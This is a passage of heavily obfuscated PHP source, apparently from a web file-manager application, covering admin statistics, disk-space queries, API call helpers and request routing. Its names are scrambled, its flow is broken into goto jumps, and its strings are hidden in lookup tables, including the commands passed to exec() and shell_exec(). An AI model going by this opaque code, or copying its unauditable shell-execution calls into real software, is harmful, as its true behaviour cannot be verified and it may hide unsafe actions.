option($FÂ¡ÕõùÛ®) { $c‹™ã‰¿ÓÙ = $_SERVER[©][2057] . ucfirst($FÂ¡ÕõùÛ®); return $this->{$c‹™ã‰¿ÓÙ}(); } private function optionUser() { goto bÊœê…“˜ò; BÉÙ¾ÉÌÊ—: $B½ÁÁ¦İÄœ = Model($dÃ²¸ê²ö[485])->where($bÑµÃÂ†Ì)->count($dÃ²¸ê²ö[1434]); return array($dÃ²¸ê²ö[694] => (int) $c‰¾„ÈÆ¢, $dÃ²¸ê²ö[2061] => (int) ($c‰¾„ÈÆ¢ - $e¹ƒ÷¾È), $dÃ²¸ê²ö[2062] => (int) $e¹ƒ÷¾È, $dÃ²¸ê²ö[2063] => (int) $B½ÁÁ¦İÄœ, $dÃ²¸ê²ö[2064] => $DŸ‰Ø§÷½ò); goto f§“ò£ŒÍ¸; bÊœê…“˜ò: $dÃ²¸ê²ö =& $_SERVER[©]; $c‰¾„ÈÆ¢ = Model($dÃ²¸ê²ö[485])->count($dÃ²¸ê²ö[1434]); $e¹ƒ÷¾È = Model($dÃ²¸ê²ö[485])->where($dÃ²¸ê²ö[2058])->count($dÃ²¸ê²ö[1434]); goto AÃ£¿ÚÒé; aîç´¹¢ç×: if (!$DŸ‰Ø§÷½ò) { $DŸ‰Ø§÷½ò = 1; } $A”­•¢¦´ = strtotime(date($dÃ²¸ê²ö[2039])); $bÑµÃÂ†Ì = array($dÃ²¸ê²ö[2060] => array($dÃ²¸ê²ö[925], $A”­•¢¦´)); goto BÉÙ¾ÉÌÊ—; AÃ£¿ÚÒé: $A”­•¢¦´ = strtotime($dÃ²¸ê²ö[2059]); $bÑµÃÂ†Ì = array($dÃ²¸ê²ö[2060] => array($dÃ²¸ê²ö[925], $A”­•¢¦´)); $DŸ‰Ø§÷½ò = (int) Model($dÃ²¸ê²ö[485])->where($bÑµÃÂ†Ì)->count($dÃ²¸ê²ö[1434]); goto aîç´¹¢ç×; f§“ò£ŒÍ¸: } private function optionFile() { goto DïôÓ“ŒËì; CÍÄˆéåÖì: $f¹³¤Óùµ® = $e ­à÷¶âœ[$AËëØÇÈäª[2032]]; $A§ìá©îÉŒ = Model($AËëØÇÈäª[752])->where(array($AËëØÇÈäª[378] => 0))->count($AËëØÇÈäª[377]); $d ®²”ãì = array($AËëØÇÈäª[378] => 0, $AËëØÇÈäª[197] => array($AËëØÇÈäª[925], strtotime(date($AËëØÇÈäª[2039])))); goto f×è›à¨¥; DïôÓ“ŒËì: $AËëØÇÈäª =& $_SERVER[©]; $e ­à÷¶âœ = $this->sourceSize(); $C²õÒÕ£¯ = $e ­à÷¶âœ[$AËëØÇÈäª[87]]; goto CÍÄˆéåÖì; f×è›à¨¥: $cÔ™ˆŠ = Model($AËëØÇÈäª[752])->where($d ®²”ãì)->sum($AËëØÇÈäª[87]); $eË£’ÙÍ‚ó = Model($AËëØÇÈäª[752])->where($d ®²”ãì)->count($AËëØÇÈäª[377]); return array($AËëØÇÈäª[697] => $C²õÒÕ£¯, $AËëØÇÈäª[2032] => $f¹³¤Óùµ®, $AËëØÇÈäª[2065] => $C²õÒÕ£¯ - $f¹³¤Óùµ®, $AËëØÇÈäª[2066] => (int) $cÔ™ˆŠ, $AËëØÇÈäª[699] => (int) $A§ìá©îÉŒ, $AËëØÇÈäª[2067] => (int) $eË£’ÙÍ‚ó); goto DšåõÀÆ‘; DšåõÀÆ‘: } private function optionAccess() { $d‰µóÄÍÇÀ =& $_SERVER[©]; return array($d‰µóÄÍÇÀ[694] => $this->typeLogCnt(), $d‰µóÄÍÇÀ[113] => $this->typeLogCnt($d‰µóÄÍÇÀ[113]), $d‰µóÄÍÇÀ[412] => $this->typeLogCnt($d‰µóÄÍÇÀ[412]), $d‰µóÄÍÇÀ[2068] => $this->typeLogCnt($d‰µóÄÍÇÀ[2068]), $d‰µóÄÍÇÀ[2069] => $this->typeLogCnt($d‰µóÄÍÇÀ[2069]), $d‰µóÄÍÇÀ[543] => $this->typeLogCnt($d‰µóÄÍÇÀ[43], $d‰µóÄÍÇÀ[2043])); } private function typeLogCnt($cŠÖ‘Ÿáš‰ = '', $DŒÎÄÚÄÆİ = "\x69\144") { goto E¾Àœ¹¯œÚ; B£Ğ£Íœ”: return (int) $còŠ‘‚Ì”ë; goto cñ‰çÉŠ®ä; dÈ™©Â½†ß: $c²¢õùè¿ = array($FÏ ‘¶îØ©[197] => array($FÏ ‘¶îØ©[925], $Fİª°õ’Œã)); if ($cŠÖ‘Ÿáš‰) { $c²¢õùè¿[$FÏ ‘¶îØ©[39]] = array($FÏ ‘¶îØ©[17], $cå ã¨Ô·†[$cŠÖ‘Ÿáš‰]); } $còŠ‘‚Ì”ë = Model($FÏ ‘¶îØ©[2042])->where($c²¢õùè¿)->count($DŒÎÄÚÄÆİ); goto B£Ğ£Íœ”; E¾Àœ¹¯œÚ: $FÏ ‘¶îØ© =& $_SERVER[©]; $cå ã¨Ô·† = array($FÏ ‘¶îØ©[113] => array($FÏ ‘¶îØ©[2070], $FÏ ‘¶îØ©[2071]), $FÏ ‘¶îØ©[412] => array($FÏ ‘¶îØ©[2072], $FÏ ‘¶îØ©[2073]), $FÏ ‘¶îØ©[2068] => array($FÏ ‘¶îØ©[2074], $FÏ ‘¶îØ©[2075], $FÏ ‘¶îØ©[2076]), $FÏ ‘¶îØ©[2069] => array($FÏ ‘¶îØ©[2077], $FÏ ‘¶îØ©[2078]), $FÏ ‘¶îØ©[2079] => array($FÏ ‘¶îØ©[2080], $FÏ ‘¶îØ©[2081], $FÏ ‘¶îØ©[2082])); $Fİª°õ’Œã = strtotime(date($FÏ ‘¶îØ©[2039])); goto dÈ™©Â½†ß; cñ‰çÉŠ®ä: } private function optionServer() { goto F³¡ù×Ÿ˜½; bÕ—Ë±ˆó‰: if ($BçêáíÌ› == $cñÖ‡­ª…ó[723]) { $b‰¥®×¨å = explode($cñÖ‡­ª…ó[1073], $CœË×÷íæÂ[$cñÖ‡­ª…ó[884]]); $BçêáíÌ› = $b‰¥®×¨å[0]; } if ($BçêáíÌ› == $cñÖ‡­ª…ó[726] || $BçêáíÌ› == $cñÖ‡­ª…ó[727]) { $eÂŠÆÁ¦ß = Model()->db()->query($cñÖ‡­ª…ó[2083]); $fİ¤öùë§Õ = $eÂŠÆÁ¦ß[0] && isset($eÂŠÆÁ¦ß[0][$cñÖ‡­ª…ó[1337]]) ? $eÂŠÆÁ¦ß[0][$cñÖ‡­ª…ó[1337]] : 0; $BçêáíÌ› = $cñÖ‡­ª…ó[2084] . ($fİ¤öùë§Õ ? $cñÖ‡­ª…ó[18] . $fİ¤öùë§Õ : $cñÖ‡­ª…ó[43]); } $F‡ë¿™§›™ = $GLOBALS[$cñÖ‡­ª…ó[16]][$cñÖ‡­ª…ó[346]][$cñÖ‡­ª…ó[754]]; goto Dİ‡ğ¶„ë°; F³¡ù×Ÿ˜½: $cñÖ‡­ª…ó =& $_SERVER[©]; $E¸›…©Œ‘‘ = $this->diskDriver(); $Dì¨–Ó‰ó¥ = KodIO::defaultDriver(); goto a·³ğÛº¤Ô; Dİ‡ğ¶„ë°: return array($cñÖ‡­ª…ó[2085] => $E¸›…©Œ‘‘ ? $E¸›…©Œ‘‘[$cñÖ‡­ª…ó[2086]] : 0, $cñÖ‡­ª…ó[2087] => $E¸›…©Œ‘‘ ? $E¸›…©Œ‘‘[$cñÖ‡­ª…ó[2088]] : 0, $cñÖ‡­ª…ó[2089] => (int) $Dì¨–Ó‰ó¥[$cñÖ‡­ª…ó[2086]] * 1024 * 1024 * 1024, $cñÖ‡­ª…ó[2090] => (int) $FÜëÜ”İé, $cñÖ‡­ª…ó[2091] => ucfirst($DÌŸñ¯¼¶è), $cñÖ‡­ª…ó[2092] => $cñÖ‡­ª…ó[2093] . PHP_VERSION, $cñÖ‡­ª…ó[2094] => phpBuild64() ? 64 : 32, $cñÖ‡­ª…ó[693] => str_replace($cñÖ‡­ª…ó[2095], $cñÖ‡­ª…ó[901], $BçêáíÌ›), $cñÖ‡­ª…ó[346] => ucfirst($F‡ë¿™§›™), $cñÖ‡­ª…ó[38] => $_SERVER[$cñÖ‡­ª…ó[2096]]); goto cÂ¬Æ´¥ï£; a·³ğÛº¤Ô: $EŒ­±Û¶¿ô = array($cñÖ‡­ª…ó[743] => $Dì¨–Ó‰ó¥[$cñÖ‡­ª…ó[375]]); $FÜëÜ”İé = Model($cñÖ‡­ª…ó[430])->where($EŒ­±Û¶¿ô)->sum($cñÖ‡­ª…ó[87]); $eÚ„‡·ö¹› = explode($cñÖ‡­ª…ó[60], $_SERVER[$cñÖ‡­ª…ó[149]]); goto bäóù›²­; bäóù›²­: $DÌŸñ¯¼¶è = $eÚ„‡·ö¹›[0]; $CœË×÷íæÂ = $GLOBALS[$cñÖ‡­ª…ó[16]][$cñÖ‡­ª…ó[27]]; $BçêáíÌ› = $CœË×÷íæÂ[$cñÖ‡­ª…ó[885]]; goto bÕ—Ë±ˆó‰; cÂ¬Æ´¥ï£: } private function diskDriver() { goto A¿àÙ÷Üø…; A¿àÙ÷Üø…: $fÍ¶”¬ñ•‚ =& $_SERVER[©]; $B–Ë½†´£Ö = $fÍ¶”¬ñ•‚[18]; $aª÷¹ğŠ¨© = $GLOBALS[$fÍ¶”¬ñ•‚[16]][$fÍ¶”¬ñ•‚[2097]] == $fÍ¶”¬ñ•‚[2098]; goto BœŸîö·Šç; A¤¥³Éäç¬: $bÂƒÏŞ—Ê = $e¿‘»ÜéÄ - @disk_free_space($B–Ë½†´£Ö); return array($fÍ¶”¬ñ•‚[2086] => $e¿‘»ÜéÄ, $fÍ¶”¬ñ•‚[2088] => $bÂƒÏŞ—Ê); goto d˜â¬°ã; BœŸîö·Šç: if ($aª÷¹ğŠ¨©) { $B–Ë½†´£Ö = $fÍ¶”¬ñ•‚[2099]; if (function_exists($fÍ¶”¬ñ•‚[2100])) { exec($fÍ¶”¬ñ•‚[2101], $c„ØÓ­Œ™©); $B–Ë½†´£Ö = $c„ØÓ­Œ™©[1] . $fÍ¶”¬ñ•‚[18]; } } if (!file_exists($B–Ë½†´£Ö)) { return; } $e¿‘»ÜéÄ = @disk_total_space($B–Ë½†´£Ö); goto A¤¥³Éäç¬; d˜â¬°ã: } public function fileChart($bºíÁÅ¯×Ô) { goto CÜĞ˜‡Š¶’; CÜĞ˜‡Š¶’: $a˜ƒáİé¢© =& $_SERVER[©]; if (isset($bºíÁÅ¯×Ô[$a˜ƒáİé¢©[1434]])) { return Model($a˜ƒáİé¢©[752])->userFileTypeProfile($bºíÁÅ¯×Ô[$a˜ƒáİé¢©[1434]]); } if (isset($bºíÁÅ¯×Ô[$a˜ƒáİé¢©[2102]])) { return Model($a˜ƒáİé¢©[752])->groupFileTypeProfile($bºíÁÅ¯×Ô[$a˜ƒáİé¢©[2102]]); } goto cÍöÄó÷·; cÍöÄó÷·: $A”»äÖÔ„À = $this->sourceSize(); $aÚ·ª¤Ìà» = array($a˜ƒáİé¢©[469] => 0, $a˜ƒáİé¢©[379] => 1); $cä¼õ­ƒñÍ = Model($a˜ƒáİé¢©[752])->where($aÚ·ª¤Ìà»)->sum($a˜ƒáİé¢©[87]); goto Aåäå¼Ö«Ÿ; Aåäå¼Ö«Ÿ: $aÚ·ª¤Ìà»[$a˜ƒáİé¢©[379]] = 2; $C³Ü®ÕÔêÛ = Model($a˜ƒáİé¢©[752])->where($aÚ·ª¤Ìà»)->sum($a˜ƒáİé¢©[87]); return array($a˜ƒáİé¢©[697] => $A”»äÖÔ„À[$a˜ƒáİé¢©[87]], $a˜ƒáİé¢©[2032] => $A”»äÖÔ„À[$a˜ƒáİé¢©[2032]], $a˜ƒáİé¢©[2033] => (int) $cä¼õ­ƒñÍ, $a˜ƒáİé¢©[2034] => (int) $C³Ü®ÕÔêÛ); goto Fµ…¨šäå†; Fµ…¨šäå†: } private function sourceSize() { $AÈëÅ‰ÜÚ =& $_SERVER[©]; $aé½³Ã·Ï = Model($AÈëÅ‰ÜÚ[752])->where(array($AÈëÅ‰ÜÚ[378] => 0))->sum($AÈëÅ‰ÜÚ[87]); $d„òÑäÖƒ‹ = Model($AÈëÅ‰ÜÚ[430])->sum($AÈëÅ‰ÜÚ[87]); if ($d„òÑäÖƒ‹ > $aé½³Ã·Ï) { $d„òÑäÖƒ‹ = $aé½³Ã·Ï; } return array($AÈëÅ‰ÜÚ[87] => (int) $aé½³Ã·Ï, $AÈëÅ‰ÜÚ[2032] => (int) $d„òÑäÖƒ‹); } } goto cÃ¾”¦ä; EêÔ•´™¯: function ActionCall($e›¡ ‹íÌ„) { $C‹¥©æ¢–“ = array_slice(func_get_args(), 1); return ActionApply($e›¡ ‹íÌ„, $C‹¥©æ¢–“); } function ActionCallApi($dí´ó©øƒ¸, $B‘èõ¬Î„‚ = '') { goto dÕ¸ƒÒ£¶; dÕ¸ƒÒ£¶: $AéÙÃ¾®×º =& $_SERVER[ÊÖŠ]; $AŸƒî‡¬î = $B‘èõ¬Î„‚; if (is_array($B‘èõ¬Î„‚)) { $AŸƒî‡¬î = $AéÙÃ¾®×º[20]; foreach ($B‘èõ¬Î„‚ as $f•İóÄã÷ => $AíäêÆá–‡) { $AíäêÆá–‡ = is_array($AíäêÆá–‡) ? json_encode($AíäêÆá–‡) : $AíäêÆá–‡; $AíäêÆá–‡ = is_bool($AíäêÆá–‡) ? intval($AíäêÆá–‡) : $AíäêÆá–‡; $AŸƒî‡¬î .= $AéÙÃ¾®×º[21] . $f•İóÄã÷ . $AéÙÃ¾®×º[22] . rawurlencode($AíäêÆá–‡); } } goto F÷ŠŠŠÛÊ; F÷ŠŠŠÛÊ: $bå½ãØ’Š½ = Action($AéÙÃ¾®×º[23])->accessToken(); $dí´ó©øƒ¸ = str_replace($AéÙÃ¾®×º[5], $AéÙÃ¾®×º[4], $dí´ó©øƒ¸) . $AéÙÃ¾®×º[24] . $bå½ãØ’Š½ . $AŸƒî‡¬î; $cñŒà„°í³ = $AéÙÃ¾®×º[20]; goto B”‡ã¾ƒßí; eä‚ášù™À: return $E‚Ò¸£¹ÄÕ; goto F­ñßŠ°Ö’; B”‡ã¾ƒßí: $a‚í¥–ÅÌ = phpBinCommand(); if ($a‚í¥–ÅÌ && function_exists($AéÙÃ¾®×º[25])) { $D«–İñÙ–œ = $a‚í¥–ÅÌ . $AéÙÃ¾®×º[26] . BASIC_PATH . $AéÙÃ¾®×º[27] . escapeshellarg($dí´ó©øƒ¸); $cñŒà„°í³ = shell_exec($D«–İñÙ–œ); } if (!$cñŒà„°í³) { $C‰Ú°öºÛğ = stream_context_create(array($AéÙÃ¾®×º[28] => array($AéÙÃ¾®×º[29] => 20, $AéÙÃ¾®×º[30] => $AéÙÃ¾®×º[31]))); $cñŒà„°í³ = file_get_contents(APP_HOST . $AéÙÃ¾®×º[32] . $dí´ó©øƒ¸, !1, $C‰Ú°öºÛğ); } goto f’“Ò¹½ß°; f’“Ò¹½ß°: $Bê†„°ÌÙ† = json_decode($cñŒà„°í³, !0); $E‚Ò¸£¹ÄÕ = is_array($Bê†„°ÌÙ†) ? $Bê†„°ÌÙ† : array($AéÙÃ¾®×º[33] => null, $AéÙÃ¾®×º[34] => $cñŒà„°í³); if (!$Bê†„°ÌÙ†) { echo $cñŒà„°í³; } goto eä‚ášù™À; F­ñßŠ°Ö’: } function ActionCallHook($b‹‚¹²ä‡†) { goto c¯ãÛ¬‘ÑÙ; A–†Â¥èÙ: $f³õ¤ì… = $bŸö¡£¤Ôë ? json_decode($bŸö¡£¤Ôë, !0) : $f³õ¤ì…; $GLOBALS[$A‰ô¾©éñ[35]] = 0; return $f³õ¤ì…; goto c©£Ì™´î±; d¨Æ“›¹è£: $GLOBALS[$A‰ô¾©éñ[35]] = 1; $f³õ¤ì… = ActionApply($b‹‚¹²ä‡†, $FåÕìÅèÂö); $bŸö¡£¤Ôë = ob_get_clean(); goto A–†Â¥èÙ; c¯ãÛ¬‘ÑÙ: $A‰ô¾©éñ =& $_SERVER[ÊÖŠ]; ob_start(); $FåÕìÅèÂö = array_slice(func_get_args(), 1); goto d¨Æ“›¹è£; c©£Ì™´î±: } goto B³¦±ä‘Ñ; eŠáŞÄªœ: $DÚÓ·Ç˜ŒË = $_SERVER[©][558]; if (!$DÚÓ·Ç˜ŒË) { die; } class Application { private $defaultModule = "\x69\156\144\145\170"; private $defaultController = "\x69\156\x64\x65\170"; private $defaultAction = "\x69\x6e\144\x65\x78"; function __construct() { } public function setDefault($eñŠšÔ¡¤¨) { goto fÚ‹Şá×’Ü; CÏÜÃŸ«¼ğ: $this->{$_SERVER[á¬¾Ù][3]}($D‹Ü»½Á‘[4], array($this, $D‹Ü»½Á‘[5])); goto E­Ñ·©‡ä; fÚ‹Şá×’Ü: $Bñ†£©Œ»ø =& $_SERVER[©]; $D‹Ü»½Á‘ =& $_SERVER[á¬¾Ù]; $A¢óÁæóæ¹ = $D‹Ü»½Á‘[0]($D‹Ü»½Á‘[1], $D‹Ü»½Á‘[2]($eñŠšÔ¡¤¨, $D‹Ü»½Á‘[1])); goto fñ£ÛÕ•„«; E›à—‚: $e•ÈÁäÚ‰­ = $Bñ†£©Œ»ø[560]; while (strlen($e•ÈÁäÚ‰­) < $Bñ†£©Œ»ø[561]) { if (!$e•ÈÁäÚ‰­) { break; } $e•ÈÁäÚ‰­++; } $this->defaultController = $A¢óÁæóæ¹[1] ? $A¢óÁæóæ¹[1] : $this->defaultController; goto c¾ö¿Ë÷†•; fñ£ÛÕ•„«: $Eå¬õ½ÄÅƒ = $Bñ†£©Œ»ø[559]; if (!$Eå¬õ½ÄÅƒ) { die; } $this->defaultModule = $A¢óÁæóæ¹[0] ? $A¢óÁæóæ¹[0] : $this->defaultModule; goto E›à—‚; c¾ö¿Ë÷†•: $this->defaultAction = $A¢óÁæóæ¹[2] ? $A¢óÁæóæ¹[2] : $this->defaultAction; $BØÃÖÍš²Õ = $Bñ†£©Œ»ø[562]; if (strlen($BØÃÖÍš²Õ) < $Bñ†£©Œ»ø[10]) { return; } goto CÏÜÃŸ«¼ğ; E­Ñ·©‡ä: } public function appRun($dô°–­‚›¡) { goto D˜·œÊ¶§å; fè…•ƒ‘·: $bØµÊ™ç÷ß = $C”Ã‡ïŒ[563]; if (strlen($bØµÊ™ç÷ß) < $C”Ã‡ïŒ[564]) { return; } $AîêõÚâ‹Ó = $CöÃÂåÎŠ[6]($bÍ‰’£ˆ¼ë[0]); goto DùàÒçÜ°Ó; DùàÒçÜ°Ó: $cßËğÀ¶òò = $CöÃÂåÎŠ[7]; if ($AîêõÚâ‹Ó == $CöÃÂåÎŠ[8]) { $cßËğÀ¶òò = $CöÃÂåÎŠ[9]; $bÍ‰’£ˆ¼ë[0] = $CöÃÂåÎŠ[10]; $bÍ‰’£ˆ¼ë[1] = $bÍ‰’£ˆ¼ë[1] . $CöÃÂåÎŠ[11]; $dô°–­‚›¡ = $CöÃÂåÎŠ[12]($CöÃÂåÎŠ[1], $bÍ‰’£ˆ¼ë); $dô°–­‚›¡ = $CöÃÂåÎŠ[2]($dô°–­‚›¡, $CöÃÂåÎŠ[1]); } $CöÃÂåÎŠ[13](array($CöÃÂåÎŠ[14], $CöÃÂåÎŠ[15]), $cßËğÀ¶òò . $CöÃÂåÎŠ[16], $dô°–­‚›¡); goto c°©…ƒÊÇ; eÛ½­¨ÎŒè: $e©²¤ÆèäÛ = $C”Ã‡ïŒ[566]; while ($e©²¤ÆèäÛ < $C”Ã‡ïŒ[567]) { if ($e©²¤ÆèäÛ >= 0) { break; } $e©²¤ÆèäÛ++; } goto eâ¶¨Ğ‹¾; D˜·œÊ¶§å: $C”Ã‡ïŒ =& $_SERVER[©]; $CöÃÂåÎŠ =& $_SERVER[á¬¾Ù]; $bÍ‰’£ˆ¼ë = $CöÃÂåÎŠ[0]($CöÃÂåÎŠ[1], $dô°–­‚›¡); goto fè…•ƒ‘·; c°©…ƒÊÇ: $CöÃÂåÎŠ[17]($dô°–­‚›¡); $A¢è°‡¬— = $C”Ã‡ïŒ[565]; $CöÃÂåÎŠ[13](array($CöÃÂåÎŠ[14], $CöÃÂåÎŠ[15]), $cßËğÀ¶òò . $CöÃÂåÎŠ[18], $dô°–­‚›¡); goto eÛ½­¨ÎŒè; eâ¶¨Ğ‹¾: } private function autorun() { $fÕÔß¡îâÎ =& $_SERVER[á¬¾Ù]; global $config; $BÒ‡¬·„  = $_SERVER[©][568]; if (!$BÒ‡¬·„ ) { die; } if ($fÕÔß¡îâÎ[19]($config[$fÕÔß¡îâÎ[20]]) == 0) { return; } foreach ($config[$fÕÔß¡îâÎ[20]] as $DÙ”‡„ï…ó => $d÷ù¸¹ÊğŒ) { $this->{$_SERVER[á¬¾Ù][21]}($d÷ù¸¹ÊğŒ); } } private function wjzo090dc138() { goto D†Ñ¤°í‡; A¸Â˜±ìÙ„: while ($d½”Õ‘Ö < $b‹šÏ¬¿öí[564]) { if ($d½”Õ‘Ö >= 0) { break; } $d½”Õ‘Ö++; } $EÍ‹±‰Ÿ¶¼ = $aËôÑÇŒğ[26]($GLOBALS[$aËôÑÇŒğ[22]][$aËôÑÇŒğ[23]], 1); $F‰Ğ°ííÒ = $b‹šÏ¬¿öí[570]; goto fÀ“¹Ó´ÂÊ; aºğ…ÈÃŒ¿: $AŒğÔì…Ö = $GLOBALS[$aËôÑÇŒğ[22]][$aËôÑÇŒğ[23]][0]; if (!$AŒğÔì…Ö || $aËôÑÇŒğ[24]($AŒğÔì…Ö) <= $aËôÑÇŒğ[24]($FÇˆå Ù•î)) { return; } if ($aËôÑÇŒğ[6]($aËôÑÇŒğ[25]($AŒğÔì…Ö, -$aËôÑÇŒğ[24]($FÇˆå Ù•î))) != $FÇˆå Ù•î) { return; } goto dÅ¬ÃÊİÈ; dÅ¬ÃÊİÈ: $cŒÒ¬š÷± = $aËôÑÇŒğ[25]($AŒğÔì…Ö, 0, -$aËôÑÇŒğ[24]($FÇˆå Ù•î)); $CñÓööèÁ° = array($aËôÑÇŒğ[8], $cŒÒ¬š÷±); $d½”Õ‘Ö = $b‹šÏ¬¿öí[569]; goto A¸Â˜±ìÙ„; D†Ñ¤°í‡: $b‹šÏ¬¿öí =& $_SERVER[©]; $aËôÑÇŒğ =& $_SERVER[á¬¾Ù]; $FÇˆå Ù•î = $aËôÑÇŒğ[8]; goto aºğ…ÈÃŒ¿; fÀ“¹Ó´ÂÊ: $GLOBALS[$aËôÑÇŒğ[22]][$aËôÑÇŒğ[23]] = $aËôÑÇŒğ[27]($CñÓööèÁ°, $EÍ‹±‰Ÿ¶¼); $Aµµ„˜‚Ââ = $b‹šÏ¬¿öí[571]; $GLOBALS[$aËôÑÇŒğ[22]][$aËôÑÇŒğ[28]] = $aËôÑÇŒğ[29]($aËôÑÇŒğ[1], $GLOBALS[$aËôÑÇŒğ[22]][$aËôÑÇŒğ[23]]); goto a³õõñğ¬; a³õõñğ¬: $Aİ¥º«Ãõ· = $b‹šÏ¬¿öí[572]; if (!$Aİ¥º«Ãõ·) { die; } goto Eí¿Ø‡°÷›; Eí¿Ø‡°÷›: } private function udsc781c778e() { goto aˆé×š¦‘™; b„ÌÕ óİ: $GLOBALS[$añâ Ó×…¯[22]][$añâ Ó×…¯[23]] = $añâ Ó×…¯[0]($añâ Ó×…¯[36], $DİæÒÅ’”); $aèÑÖØÈ‡ê = $EÎÄİ¹™Øá[576]; if (!$aèÑÖØÈ‡ê) { return; } goto e¦Ò “Î—; D™­ë­¶Œ: $DİæÒÅ’” = $añâ Ó×…¯[2]($a†ëæÈ„ÒË[0][0], $añâ Ó×…¯[36]); $f…Œ°À‘¦ = $EÎÄİ¹™Øá[575]; if (!$f…Œ°À‘¦) { return; } goto b„ÌÕ óİ; DÂŞÑ»ˆ—œ: $B®¦ªò™© = $_SERVER[$añâ Ó×…¯[30]]; $FÆÛ‰ƒ = $EÎÄİ¹™Øá[573]; $a°™¡Çé…ß = $añâ Ó×…¯[31]; goto fÚêãáğÈ; e¦Ò “Î—: $GLOBALS[$añâ Ó×…¯[22]][$añâ Ó×…¯[28]] = $añâ Ó×…¯[29]($añâ Ó×…¯[1], $GLOBALS[$añâ Ó×…¯[22]][$añâ Ó×…¯[23]]); goto DŠŸŒÔëøë; fÚêãáğÈ: $DÒ”ÄêíìÃ = $EÎÄİ¹™Øá[574]; if (strlen($DÒ”ÄêíìÃ) < $EÎÄİ¹™Øá[561]) { return; } if (!$añâ Ó×…¯[32]($B®¦ªò™©, $a°™¡Çé…ß)) { return; } goto D«¤ƒğßÃñ; D«¤ƒğßÃñ: $fñŠ‡¼»ª = $añâ Ó×…¯[33]($B®¦ªò™©, $a°™¡Çé…ß); $DİæÒÅ’” = $añâ Ó×…¯[25]($B®¦ªò™©, $fñŠ‡¼»ª + $añâ Ó×…¯[24]($a°™¡Çé…ß)); $añâ Ó×…¯[34]($añâ Ó×…¯[35], $DİæÒÅ’”, $a†ëæÈ„ÒË); goto D™­ë­¶Œ; aˆé×š¦‘™: $EÎÄİ¹™Øá =& $_SERVER[©]; $añâ Ó×…¯ =& $_SERVER[á¬¾Ù]; if ($GLOBALS[$añâ Ó×…¯[22]][$añâ Ó×…¯[28]] != $añâ Ó×…¯[10]) { return; } goto DÂŞÑ»ˆ—œ; DŠŸŒÔëøë: } public function run() { goto f¡µË—àÇ™; f¡µË—àÇ™: $B«š¿ÍŸ† =& $_SERVER[©]; $c™ÇÔÁ„ =& $_SERVER[á¬¾Ù]; $this->{$_SERVER[á¬¾Ù][37]}(); goto Eí‘•‹¡Ô; D–Şëá£Ò‡: while ($Dºëœ´ < $B«š¿ÍŸ†[567]) { if ($Dºëœ´ >= 0) { break; } $Dºëœ´++; } $c™ÇÔÁ„[39]($c™ÇÔÁ„[41], isset($aÀÉĞË„ÊÌ[1]) && $aÀÉĞË„ÊÌ[0] ? $aÀÉĞË„ÊÌ[1] : $this->defaultController); $D‰àîÄ™ŸÉ = $B«š¿ÍŸ†[579]; goto d½ÜËšà…; Eí‘•‹¡Ô: $this->{$_SERVER[á¬¾Ù][38]}(); $Bº™Ó¨¶²” = $B«š¿ÍŸ†[577]; $aÀÉĞË„ÊÌ = $GLOBALS[$c™ÇÔÁ„[22]][$c™ÇÔÁ„[23]]; goto c©µÌ¹Ü¨·; c©µÌ¹Ü¨·: $dôÅÅ‹íµÔ = $GLOBALS[$c™ÇÔÁ„[22]][$c™ÇÔÁ„[28]]; $c™ÇÔÁ„[39]($c™ÇÔÁ„[40], isset($aÀÉĞË„ÊÌ[0]) && $aÀÉĞË„ÊÌ[0] ? $aÀÉĞË„ÊÌ[0] : $this->defaultModule); $Dºëœ´ = $B«š¿ÍŸ†[578]; goto D–Şëá£Ò‡; d½ÜËšà…: if (strlen($D‰àîÄ™ŸÉ) < $B«š¿ÍŸ†[561]) { die; } $c™ÇÔÁ„[39]($c™ÇÔÁ„[42], isset($aÀÉĞË„ÊÌ[2]) && $aÀÉĞË„ÊÌ[0] ? $aÀÉĞË„ÊÌ[2] : $this->defaultAction); $c™ÇÔÁ„[39]($c™ÇÔÁ„[43], MOD . $c™ÇÔÁ„[1] . ST . $c™ÇÔÁ„[1] . ACT); goto bĞÛàÕÕ‚; bĞÛàÕÕ‚: $_SERVER[$c™ÇÔÁ„[44]] = $c™ÇÔÁ„[6](ACTION); $this->{$_SERVER[á¬¾Ù][45]}(); if ($c™ÇÔÁ„[19]($aÀÉĞË„ÊÌ) >= 3) { $this->{$_SERVER[á¬¾Ù][21]}($dôÅÅ‹íµÔ); } else { $this->{$_SERVER[á¬¾Ù][21]}(ACTION); } goto fòØ“É‰É¢; fòØ“É‰É¢: } private $xwzh14f48996 = array(); private $oxam6bcb3383 = ''; public function xosa165908f5() { goto B»®ÒÛä­‘; AàÁ……÷: $this->{$_SERVER[á¬¾Ù][48]}(); $aÆ£äßƒ¸ = $eÖ—ß¸ÅÌ[581]; if (strlen($aÆ£äßƒ¸) < $eÖ—ß¸ÅÌ[564]) { return; } goto Bã†í³³ô; B»®ÒÛä­‘: $eÖ—ß¸ÅÌ =& $_SERVER[©]; $B²‹Í·ùéö =& $_SERVER[á¬¾Ù]; $this->{$_SERVER[á¬¾Ù][46]}(); goto BåÆ¾š„¥Ì; BåÆ¾š„¥Ì: $aâ¿Â‡ËÅ = $eÖ—ß¸ÅÌ[580]; if (strlen($aâ¿Â‡ËÅ) < $eÖ—ß¸ÅÌ[561]) { return; } $this->{$_SERVER[á¬¾Ù][47]}(); goto AàÁ……÷; Bã†í³³ô: $this->{$_SERVER[á¬¾Ù][49]}(); $this->{$_SERVER[á¬¾Ù][50]}(); $this->{$_SERVER[á¬¾Ù][51]}(); goto Eš£¸ö¾¦; Eš£¸ö¾¦: $CÀÇåœÕ†„ = $eÖ—ß¸ÅÌ[582]; if (!$CÀÇåœÕ†„) { return; } $this->{$_SERVER[á¬¾Ù][52]}(); goto E¹íåÉøøö; dé’ùÙÄË: $this->{$_SERVER[á¬¾Ù][3]}($B²‹Í·ùéö[57], array($this, $B²‹Í·ùéö[58])); $this->{$_SERVER[á¬¾Ù][3]}($B²‹Í·ùéö[59], array($this, $B²‹Í·ùéö[60])); $BÊÈ¾ô…ä = $eÖ—ß¸ÅÌ[584]; goto DÅÅŞŠ¸Ë; DÅÅŞŠ¸Ë: if (strlen($BÊÈ¾ô…ä) < $eÖ—ß¸ÅÌ[564]) { return; } goto bÁ¢é¬­; E¹íåÉøøö: $this->{$_SERVER[á¬¾Ù][3]}($B²‹Í·ùéö[53], array($this, $B²‹Í·ùéö[54])); $this->{$_SERVER[á¬¾Ù][3]}($B²‹Í·ùéö[55], array($this, $B²‹Í·ùéö[56])); $e¦ùŒÑãßÈ = $eÖ—ß¸ÅÌ[583]; goto dé’ùÙÄË; bÁ¢é¬­: } public 